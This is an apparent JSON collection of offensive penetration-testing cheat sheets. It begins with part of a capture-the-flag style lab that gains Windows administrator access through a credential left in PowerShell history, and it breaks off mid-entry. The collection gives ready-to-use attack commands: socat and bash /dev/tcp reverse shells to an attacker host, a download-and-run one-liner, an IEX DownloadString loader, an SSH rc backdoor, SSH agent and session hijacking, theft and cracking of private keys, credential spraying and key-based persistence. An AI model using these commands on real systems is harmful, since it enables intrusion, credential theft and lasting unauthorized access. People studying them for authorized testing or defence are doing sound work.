            "code": "xfreerdp3 /u:tyler.ramsey /p:'P@ssw0rd!' /v:10.1.146.220 /dynamic-resolution +clipboard /cert:ignore"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "RDP Works",
            "variant": "important"
          },
          {
            "type": "text",
            "content": "---"
          }
        ]
      },
      {
        "title": "Windows PrivEsc Checklist (Unprivileged User)",
        "substeps": [
          {
            "title": "Initial Situational Awareness",
            "codes": [
              {
                "lang": "bash",
                "code": "# Locally\ncd /opt/powershellSurvey && ./serve-tools.sh -d /opt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "In Memory",
            "codes": [
              {
                "lang": "powershell",
                "code": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.200.32.9/Latch.ps1')\""
              },
              {
                "lang": "bash",
                "code": "# Latch Output\n==============================================================\n    Latch - Windows PrivEsc Enumeration\n    Output: .\\LatchOutput\n    Admin: NO | Domain Joined: NO\n==============================================================\n[!] Not running as admin - some checks will be limited\n[02:12:25][6%] [*] Gathering system information...\n[02:12:30][6%] [+] System info saved to sysinfo.txt\n[02:12:30][12%] [*] Gathering network information...\n[02:12:32][12%] [+] Network info saved to network.txt\n[02:12:32][19%] [*] Checking installed patches...\n[02:12:34][19%] [+] Patches saved to patches.txt\n[02:12:34][25%] [*] Checking quick win locations...\n[02:12:34][25%] [+] Quick wins saved to quickwins.txt\n[02:12:34][31%] [*] Checking for unattend files...\n[02:15:15][31%] [+] Unattend check saved to unattend.txt\n[02:15:15][38%] [*] Checking for web config files...\n[02:15:15][38%] [+] Web configs saved to webconfigs.txt\n[02:15:15][44%] [*] Enumerating services...\n[02:15:16][44%] [+] Services saved to services_*.txt\n[02:15:16][50%] [*] Enumerating scheduled tasks...\n[02:15:22][50%] [+] Scheduled tasks saved to schtasks_*.txt\n[02:15:22][56%] [*] Checking autorun locations...\n[02:15:22][56%] [+] Autoruns saved to autoruns.txt\n[02:15:22][62%] [*] Checking AlwaysInstallElevated...\n[02:15:22][62%] [+] AlwaysInstallElevated check saved\n[02:15:22][69%] [*] Enumerating installed software...\n[02:15:22][69%] [+] Software list saved to software.txt\n[02:15:22][75%] [*] Enumerating processes...\n[02:15:22][75%] [+] Processes saved to processes.txt\n[02:15:22][81%] [*] Checking PATH for writable directories...\n[02:15:23][81%] [!] FOUND: 1 writable PATH directories\n[02:15:23][81%] [+] DLL hijack check saved to dll_hijack.txt\n[02:15:23][88%] [*] Generating directory trees...\n[02:15:23][88%] [+] Directory tree saved to tree_all.txt\n\n============================================================\n  LATCH COMPLETE\n============================================================\n  Output: .\\LatchOutput\n\n  Review these files:\n    type .\\LatchOutput\\sysinfo.txt\n    type .\\LatchOutput\\quickwins.txt\n    type .\\LatchOutput\\services_nonstandard.txt"
              },
              {
                "lang": "bash",
                "code": "# Quick Wins File Content.\n=== POWERSHELL HISTORY ===\nnet user administrator \"ebz0yxy3txh9BDE*yeh\""
              },
              {
                "lang": "bash",
                "code": "cd /opt/authfinder && python3 authfinder.py 10.1.146.220 'administrator' 'ebz0yxy3txh9BDE*yeh'"
              },
              {
                "lang": "bash",
                "code": "#Output\n[Target] 10.1.146.220 | User: administrator\n    Service      Auth     Exec       Notes\n    \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    smbexec      FAILED   -          \n    wmi          OK       FAILED     WMI exec failed\n    psexec       FAILED   -          timed out\n    atexec       OK       OK        \n    rdp          OK       FAILED     exec failed. Try manual RDP."
              },
              {
                "lang": "bash",
                "code": "xfreerdp3 /u:administrator /p:'ebz0yxy3txh9BDE*yeh' /v:10.1.146.220 /dynamic-resolution +clipboard /cert:ignore"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Logged in as Administrator!",
                "variant": "important"
              }
            ]
          },
          {
            "title": "Flag!",
            "codes": [
              {
                "lang": "bash",
                "code": "C:\\Users\\Administrator>ipconfig\n\nWindows IP Configuration\n\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . :\n   Link-local IPv6 Address . . . . . : fe80::ca4d:faa2:112b:22eb%3\n   IPv4 Address. . . . . . . . . . . : 10.1.146.220\n   Subnet Mask . . . . . . . . . . . : 255.255.192.0\n   Default Gateway . . . . . . . . . : 10.1.128.1\n\nC:\\Users\\Administrator>whoami\nec2amaz-m1lfcno\\administrator\n\nC:\\Users\\Administrator>type Desktop\\root.txt\n3835538****************9ef125496"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "text",
                "content": "---"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "All commands output to files for organized enumeration. Check **SeImpersonatePrivilege** first - if present, jump to Potato Attacks.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Lessons Learned",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Always check for low hanging fruit first. PowerShell history can contain credentials.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "RustScan",
        "url": "https://github.com/RustScan/RustScan"
      },
      {
        "text": "feroxbuster",
        "url": "https://github.com/epi052/feroxbuster"
      },
      {
        "text": "nikto",
        "url": "https://github.com/sullo/nikto"
      },
      {
        "text": "ffuf",
        "url": "https://github.com/ffuf/ffuf"
      },
      {
        "text": "nmap",
        "url": "https://github.com/nmap/nmap"
      },
      {
        "text": "SecLists",
        "url": "https://github.com/danielmiessler/SecLists"
      },
      {
        "text": "authfinder",
        "url": "https://github.com/Real-Fruit-Snacks/authfinder"
      },
      {
        "text": "nxc_enum",
        "url": "https://github.com/Real-Fruit-Snacks/nxc_enum"
      }
    ],
    "lab": true
  },
  {
    "category": "NetExec",
    "title": "SMB Enumeration",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Test Single Credential",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Green `(Pwn3d!)` indicates local admin access.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Test Multiple Targets",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Test with Username List",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u users.txt -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Test with Password List",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p passwords.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Test with Both Lists",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u users.txt -p passwords.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "This tests every user/password combination - can cause account lockouts.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Continue on Success",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u users.txt -p passwords.txt --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Keeps testing even after finding valid credentials.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SMTP Enumeration",
    "title": "SMTP User Enumeration",
    "tags": [
      "Discovery",
      "Reconnaissance",
      "SMTP"
    ],
    "steps": [
      {
        "title": "Connect with Netcat",
        "codes": [
          {
            "lang": "bash",
            "code": "nc -nv <Target> 25"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Verify User Exists",
        "codes": [
          {
            "lang": "bash",
            "code": "VRFY <Username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Expand Mailing List",
        "codes": [
          {
            "lang": "bash",
            "code": "EXPN <MailingList>"
          }
        ],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Python VRFY Script",
        "codes": [
          {
            "lang": "python",
            "code": "#!/usr/bin/python\nimport socket\nimport sys\n\nif len(sys.argv) != 3:\n    print(\"Usage: vrfy.py <username> <target_ip>\")\n    sys.exit(0)\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((sys.argv[2], 25))\n\nbanner = s.recv(1024)\nprint(banner)\n\nuser = (sys.argv[1]).encode()\ns.send(b'VRFY ' + user + b'\\r\\n')\nresult = s.recv(1024)\nprint(result)\n\ns.close()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Run Script",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 vrfy.py <Username> <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows SMTP Enumeration",
        "substeps": [
          {
            "title": "Test SMTP Port",
            "codes": [
              {
                "lang": "powershell",
                "code": "Test-NetConnection -Port 25 <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Install Telnet Client",
            "codes": [
              {
                "lang": "powershell",
                "code": "dism /online /Enable-Feature /FeatureName:TelnetClient"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Requires admin privileges. Alternatively, copy **telnet.exe** from another Windows machine.",
                "variant": "warning"
              }
            ]
          },
          {
            "title": "Connect with Telnet",
            "codes": [
              {
                "lang": "bash",
                "code": "telnet <Target> 25"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Living off the Land from a Windows machine.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Pentesting SMTP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "SMTP supports **VRFY** (verify email address) and **EXPN** (expand mailing list) commands that can be abused to enumerate valid users.\n- Response **252** indicates user exists\n- Response **550** indicates user unknown",
        "variant": "info"
      }
    ]
  },
  {
    "category": "SNMP Enumeration",
    "title": "SNMP Enumeration",
    "tags": [
      "Discovery",
      "Network",
      "Reconnaissance",
      "SNMP"
    ],
    "steps": [
      {
        "title": "Key Windows MIB OIDs",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key Windows MIB OIDs:\n- **1.3.6.1.4.1.77.1.2.25** - User Accounts\n- **1.3.6.1.2.1.25.4.2.1.2** - Running Programs\n- **1.3.6.1.2.1.25.6.3.1.2** - Installed Software\n- **1.3.6.1.2.1.6.13.1.3** - TCP Local Ports\n- **1.3.6.1.2.1.25.4.2.1.4** - Processes Path\n- **1.3.6.1.2.1.25.2.3.1.4** - Storage Units",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Nmap UDP Scan",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo nmap -sU --open -p 161 <NetworkRange> -oG open-snmp.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Brute Force Community Strings",
        "codes": [
          {
            "lang": "bash",
            "code": "echo public > community\necho private >> community\necho manager >> community"
          },
          {
            "lang": "bash",
            "code": "for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips"
          },
          {
            "lang": "bash",
            "code": "onesixtyone -c community -i ips"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create wordlist of community strings and list of target IPs for brute forcing with **onesixtyone**.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Enumerate Entire MIB Tree",
        "codes": [
          {
            "lang": "bash",
            "code": "snmpwalk -c <CommunityString> -v1 -t 10 <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Windows Users",
        "codes": [
          {
            "lang": "bash",
            "code": "snmpwalk -c <CommunityString> -v1 <Target> 1.3.6.1.4.1.77.1.2.25"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Running Processes",
        "codes": [
          {
            "lang": "bash",
            "code": "snmpwalk -c <CommunityString> -v1 <Target> 1.3.6.1.2.1.25.4.2.1.2"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate Installed Software",
        "codes": [
          {
            "lang": "bash",
            "code": "snmpwalk -c <CommunityString> -v1 <Target> 1.3.6.1.2.1.25.6.3.1.2"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumerate TCP Listening Ports",
        "codes": [
          {
            "lang": "bash",
            "code": "snmpwalk -c <CommunityString> -v1 <Target> 1.3.6.1.2.1.6.13.1.3"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Pentesting SNMP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**SNMP** (UDP 161) is often misconfigured with default community strings (**public**/**private**). SNMPv1, v2, v2c have no encryption. The MIB tree contains system info, users, processes, software, and open ports.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Reverse Shells",
    "title": "Socat Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Attacker Listener",
        "codes": [
          {
            "lang": "bash",
            "code": "socat file:`tty`,raw,echo=0 TCP-L:<Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Victim Command",
        "codes": [
          {
            "lang": "bash",
            "code": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<AttackerIP>:<Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "One-liner with Download",
        "codes": [
          {
            "lang": "bash",
            "code": "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<AttackerIP>:<Port>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "Spider Shares",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Spider All Readable Shares",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M spider_plus"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Recursively lists all files in accessible shares.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Spider with Pattern Matching",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M spider_plus -o PATTERN=password"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Searches for files containing \"password\" in the name."
          }
        ]
      },
      {
        "title": "Spider with File Extensions",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -M spider_plus -o EXCLUDE_EXTS=jpg,png,gif"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "MS SQL Privilege Escalation",
    "title": "SQL Server Privilege Escalation",
    "tags": [
      "Exploitation",
      "Privilege_Escalation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "Check Current Privileges",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT IS_SRVROLEMEMBER('sysadmin')\nSELECT IS_SRVROLEMEMBER('public')\nSELECT SYSTEM_USER\nSELECT USER_NAME()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Impersonation Attack",
        "codes": [
          {
            "lang": "sql",
            "code": "-- Check for impersonation privileges\nSELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'\n\n-- Execute as another user\nEXECUTE AS LOGIN = 'sa'\nSELECT SYSTEM_USER\nSELECT IS_SRVROLEMEMBER('sysadmin')\nREVERT"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If **IMPERSONATE** permission exists, can execute as higher-privileged user.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Database Owner Impersonation",
        "codes": [
          {
            "lang": "sql",
            "code": "-- Find trustworthy databases\nSELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1\n\n-- Execute as dbo\nUSE <TrustworthyDB>\nEXECUTE AS USER = 'dbo'\nSELECT SYSTEM_USER"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**db_owner** can execute as **dbo** in trustworthy databases.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "PowerUpSQL Wiki",
        "url": "https://github.com/NetSPI/PowerUpSQL/wiki"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Escalate from low-privilege SQL user to sysadmin or OS command execution.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "SSH Attacks",
    "title": "SSH Agent Forwarding Attacks",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "SSH"
    ],
    "steps": [
      {
        "title": "When Agent Forwarding is Enabled",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "User's local agent is accessible on remote host. If we compromise remote host, we can use forwarded agent.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Check for Forwarded Agent",
        "codes": [
          {
            "lang": "bash",
            "code": "env | grep SSH_AUTH_SOCK"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Use Forwarded Agent",
        "codes": [
          {
            "lang": "bash",
            "code": "# On compromised host with forwarded agent\nssh-add -l  # List available keys\nssh <User>@<NextTarget>  # Pivot using forwarded keys"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Persistent Agent Hijacking",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create script to check for agent sockets\ncat > /tmp/agent_hijack.sh << 'EOF'\nfor sock in /tmp/ssh-*/agent.*; do\n    export SSH_AUTH_SOCK=$sock\n    if ssh-add -l 2>/dev/null; then\n        echo \"Valid agent: $sock\"\n        ssh <User>@<Target> \"id\"\n    fi\ndone\nEOF\nchmod +x /tmp/agent_hijack.sh"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SSH Attacks",
    "title": "SSH Hijacking with ControlMaster",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "SSH"
    ],
    "steps": [
      {
        "title": "ControlMaster Theory",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "SSH multiplexing shares single connection for multiple sessions. Hijack existing socket for access without credentials.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Find Control Sockets",
        "codes": [
          {
            "lang": "bash",
            "code": "find /tmp -name \"ssh-*\" 2>/dev/null\nls -la /tmp/ssh-*/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Hijack Existing Session",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh -S /tmp/ssh-<Socket>/agent.<PID> <User>@<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Configure ControlMaster (Attacker)",
        "codes": [
          {
            "lang": "bash",
            "code": "# ~/.ssh/config\nHost *\n    ControlMaster auto\n    ControlPath /tmp/ssh-%r@%h:%p\n    ControlPersist 10m"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SSH Attacks",
    "title": "SSH Key Authentication",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "SSH"
    ],
    "steps": [
      {
        "title": "Find SSH Keys",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"id_ecdsa\" 2>/dev/null"
          },
          {
            "lang": "bash",
            "code": "cat /home/*/.ssh/id_rsa\ncat /root/.ssh/id_rsa"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Find Authorized Keys",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /home/*/.ssh/authorized_keys\ncat /root/.ssh/authorized_keys"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Use Stolen Key",
        "codes": [
          {
            "lang": "bash",
            "code": "chmod 600 stolen_key\nssh -i stolen_key <User>@<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Crack Encrypted Key",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh2john stolen_key > key.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt key.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "HackTricks - SSH",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "SSH keys provide passwordless authentication. Stolen keys enable lateral movement.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Linux Persistence",
    "title": "SSH Key Persistence",
    "tags": [
      "Linux",
      "Persistence"
    ],
    "steps": [
      {
        "title": "Add Authorized Key",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"<PublicKey>\" >> /home/<User>/.ssh/authorized_keys\necho \"<PublicKey>\" >> /root/.ssh/authorized_keys"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate Key Pair",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh-keygen -t rsa -b 4096 -f persistence_key -N \"\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Create .ssh Directory if Missing",
        "codes": [
          {
            "lang": "bash",
            "code": "mkdir -p /home/<User>/.ssh\nchmod 700 /home/<User>/.ssh\ntouch /home/<User>/.ssh/authorized_keys\nchmod 600 /home/<User>/.ssh/authorized_keys"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SSH Attacks",
    "title": "SSH Persistence",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "SSH"
    ],
    "steps": [
      {
        "title": "Add Authorized Key",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"<PublicKey>\" >> /home/<User>/.ssh/authorized_keys\necho \"<PublicKey>\" >> /root/.ssh/authorized_keys"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Generate Key Pair",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh-keygen -t rsa -b 4096 -f persistence_key -N \"\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Create .ssh Directory if Missing",
        "codes": [
          {
            "lang": "bash",
            "code": "mkdir -p /home/<User>/.ssh\nchmod 700 /home/<User>/.ssh\ntouch /home/<User>/.ssh/authorized_keys\nchmod 600 /home/<User>/.ssh/authorized_keys"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Config File Backdoors",
    "title": "SSH RC Backdoor",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Execute on SSH Login",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.ssh/rc\nchmod +x ~/.ssh/rc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "SSH Attacks",
    "title": "SSH-Agent Hijacking",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "SSH"
    ],
    "steps": [
      {
        "title": "SSH-Agent Theory",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**ssh-agent** holds decrypted private keys in memory. Hijacking agent socket allows key use.",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "Find Agent Sockets",
        "codes": [
          {
            "lang": "bash",
            "code": "find /tmp -name \"agent.*\" 2>/dev/null\nenv | grep SSH_AUTH_SOCK"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Hijack SSH-Agent",
        "codes": [
          {
            "lang": "bash",
            "code": "export SSH_AUTH_SOCK=/tmp/ssh-<Socket>/agent.<PID>\nssh-add -l  # List keys in hijacked agent\nssh <User>@<Target>  # Use keys for auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Find Users with Agent Forwarding",
        "codes": [
          {
            "lang": "bash",
            "code": "ps aux | grep \"ssh.*-A\"\ngrep -r \"ForwardAgent yes\" /home/*/.ssh/config 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Stack Overflow Theory",
    "title": "Stack Buffer Overflow Theory",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "Stack_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "Vulnerable Code Pattern [Knowledge]",
        "codes": [
          {
            "lang": "c",
            "code": "void vulnerable(char *input) {\n    char buffer[256];\n    strcpy(buffer, input);  // No bounds checking!\n    // If input > 256 bytes, overflow occurs\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Classic stack overflow occurs with unsafe string functions."
          }
        ]
      },
      {
        "title": "Stack Layout During Overflow [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Before Overflow:\n+------------------+\n|    Arguments     |  Higher addresses\n+------------------+\n|  Return Address  |  <- Target for control\n+------------------+\n|    Saved EBP     |\n+------------------+\n|                  |\n|  Local Buffer    |  <- Overflow starts here\n|    (256 bytes)   |\n|                  |\n+------------------+  Lower addresses\n\nAfter Overflow (with 300 bytes):\n+------------------+\n|    AAAAAAAAAA    |  Arguments overwritten\n+------------------+\n|    0x41414141    |  Return address overwritten\n+------------------+\n|    0x41414141    |  Saved EBP overwritten\n+------------------+\n|                  |\n|  AAAAAAAAAAAAA   |  Buffer filled\n|    (256 bytes)   |\n|                  |\n+------------------+"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understanding what gets overwritten and in what order."
          }
        ]
      },
      {
        "title": "Exploitation Goal [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Overwrite the return address to redirect execution to attacker-controlled shellcode:\n1. Determine exact offset to return address\n2. Find location to store shellcode\n3. Find address to redirect execution (JMP ESP gadget)\n4. Construct payload: padding + return address + shellcode",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Memory Protections [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Modern Windows includes protections against exploitation:\n- **DEP (Data Execution Prevention)**: Prevents code execution from stack/heap\n- **ASLR (Address Space Layout Randomization)**: Randomizes module base addresses\n- **Stack Canaries (GS)**: Detects stack corruption before return\n- **SafeSEH**: Validates exception handlers\n- **CFG (Control Flow Guard)**: Validates indirect call targets",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Bypassing Protections [Knowledge]",
        "codes": [],
        "optional": false,
